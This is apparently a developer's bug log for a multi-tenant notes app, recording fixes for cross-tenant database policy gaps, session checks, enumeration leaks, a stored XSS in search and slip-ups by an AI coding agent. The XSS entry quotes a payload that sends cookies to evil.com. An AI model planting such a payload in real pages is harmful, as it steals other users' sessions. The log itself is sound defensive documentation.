# BUGS.md

Stuff I caught and fixed. Each has a commit SHA on main.
No SHA = not a bug yet 

**Format:**

```
## <what was wrong>

**<crit | high | med | low>** — fix `<7-char sha>`

First paragraph: what happened

Second paragraph: How I fixed it
```

Severity guide: 
crit/high = touches tenant isolation, auth, secret
keys, or the AI path. 
med = same-tenant info leak, bad logging.
low = build/config/hygiene.

---

## Ran on Node 16 and used legacy Supabase key names

**high** — fix `<sha>`

Two in one. Agent was on Node 16 despite the Node 20 pin — caught it
when having issues with AsyncLocalStorage and using supabase serivce role directly
ignoring the pushiable and secret key instructions in agents.md

Updated instructions for node version and updated all refrences to use the correct keys.

---

## uuid package installed for ID generation when Postgres already handles it

**low** — fix `<sha>`

Agent unecessary installed uuid package to geenrate id when postgres already handles it.
Also app code should never touch it. Also it installed @types/uuid which is deprecated.

Removed the dev dependency and added a note in the agents.md to never use uuid in app code.

---

## Anyone who has access to two orgs could bypass security and move a note between them

**crit** — fix `023e167`


The RLS policy would only check that if the user is a member of the org
and has access to the note. It did not check that the user is a member
of the new org after a user send a request to update a note that is in ORG A 
with org_id = ORG B. This notes and all it's details would move to ORG B.

Note:- We could have also used RLS with a CHECK constraint but that could have
lead to recursion risk since we would have to self reference the node row for org_id.
Also this also protect any opertations from our service role key unless we want it to
happen.


Added an immutable trigger that throws error if the org_id changes from its 
original value. 

---

## Same RLSS policy loophole in other tables and same fix as well

**crit** — fix `198c27f`


After fixing the note's org_id loophole, I checked other tables with 
an update policy and found the same loophole in four of them.

1. `note_shares` — `note_id` could be changed so a share pointing at 
one note now points at another.
2. `memberships` — both `user_id` and `org_id` were changeable, meaning an
 admin's UPDATE for a role change could also silently transfer someone's
 membership to a different user or a different org. 

3. `tags` — admin rename policy didn't block changing `org_id`, so a tag
 could be moved cross-tenant. 
 
4. `ai_summaries` — both `note_id` and `org_id`
 changeable, same cross-tenant leak as notes. 
  

Added migration 0007 that adds a immutable trigger on each of the four
tables. The trigger basically does the same thing check if the old and new
IDs are same and if not throws an error.

---


## Auth was not verifying session tampered tokens would have bypassed security

**high** — fix `3f6b000`


the require user logic was flawed. it was only checking if the user is logged in 
but not if the session is valid or not. An old session token or a 
tampered one would have bypassed security.


added getUser() which verifies session directly with supabase auth. so 
if session is expired or tampered it will be caught immediately.


---


## addmember action leaked whether a user was registered or not

**med** — fix `f54ad9d`


using addmember action and anyone can brute force and find out which emails are registered. The response told whether the user was registered or not and if they were already a member or not. 

Update the response to a genric error message and fixed it.

---

## Visiting /org/create crashed the app with an infinite redirect loop

**high** — fix `858a03f`


When a new user signs up for the app, they don't have an org yet. So the system redirects them to the create-org page. But the create-org page is inside the (app) route group, 
which means the (app)/layout.tsx runs first for every request to that URL. 
That layout checks "does this user have any org memberships?" and if not, redirects to /org/create. 
Hence create an infinte loop of redirects.

Removed redirect from layout and now when a user without an org visits /org/create 
page it renders the page directly.


---


## An admin of an org could list, inject, or revoke shares on notes they don't own

**high** — fix `f0255b5`

This meant any org admin could list, inject, or revoke shares on notes
they don't own, as long as they could guess or discover a note UUID
from another org.

Added `.eq("org_id", orgId)` to the notes select inside `canManageShares`
so the note lookup only succeeds if the note belongs to the same org the
caller is operating in. 


---


## Files attached to private notes were downloadable by any org member

**high** — fix `f0255b5`

Anyone could download files attached to private notes by guessing file paths.
Issue was in RLS policy for storage bucket which did not check note visibility.
It only checked whether user was an org member or not. The app was enforcing 
org policies but the user can directly bypass it and download files using supabase storage api
without going through our app.


Replaced the SELECT policy (migration 0010) with one that mirrors the notes
visibility model: the author always has access; org-wide notes are readable
by any org member; private notes require an explicit `note_shares` row.

---


## AI summarizer allows large notes to Anthropic with no size check

**med** — fix `f0255b5`

Anyone can spam the summary api with no limit on note size.
they could have a billion character note and spam it repeatedly.

Fixed it by adding a 20,000 character hard cap on note size. 

---

## Search results could run attacker JavaScript in other users' browsers

**high** — fix `a324674`

When you search for notes, the app highlights the matching words in a snippet using Postgres's `ts_headline` function. The problem is that `ts_headline` doesn't HTML-escape the note content — it just wraps matched words in `<mark>` tags and returns everything else verbatim. The app then rendered that snippet directly into the DOM using `dangerouslySetInnerHTML`.

So if someone saved a note containing `<img src=x onerror=fetch('https://evil.com?c='+document.cookie)>`, that tag would execute in the browser of any other org member who searched for a word in that note. Classic stored XSS — one person writes it, everyone else gets hit.

Fixed by switching to control-character sentinels (`STX`/`ETX`) as the highlight markers instead of raw `<mark>` tags, HTML-escaping the entire snippet output, then substituting real `<mark>` tags back in. User content can't contain those control characters so they survive the escape chain unchanged.

---

## uuid package crept back into production code after being banned

**low** — fix `ece63cf`

The `uuid` package was already banned in a prior BUGS.md entry because Postgres generates IDs better. It came back anyway — added to `package.json` dependencies and imported in `lib/notes/actions.ts` to mint note and version IDs before inserting them.

Removed it from production deps, replaced the three `uuidv4()` call sites with `insert().select('id').single()` so Postgres mints the IDs atomically on insert. The package stays in devDependencies because the test fixtures use it for stable test data.

---

## File download route leaked whether a file ID existed in another org

**low** — fix `7bba1db`

The `/api/files/[fileId]/download` route returned a `403 Forbidden` when the file existed in a different org, and `404 Not Found` when the UUID didn't exist at all. That difference is enough to confirm whether any given UUID is a valid file somewhere in the system — just scan UUIDs and watch which error you get.

The root cause was that `getFileInfo` used the admin (service-role) database client to fetch the file row by the caller-supplied ID before checking if the caller was allowed to see it. Fixed by switching the initial lookup to the user-scoped client, which enforces RLS and returns nothing for inaccessible files. Both "wrong org" and "doesn't exist" now look identical to the caller.

---


## digital ocean inferenc eicnorrect and dokcer file incorrect condifuration hardcoded port

**high** — fix 

Changed digital ocean endpoint in server code to use env var and also fixed the docker file to use env var for port instead of hardcoding it to 3000. 

Added proper health check 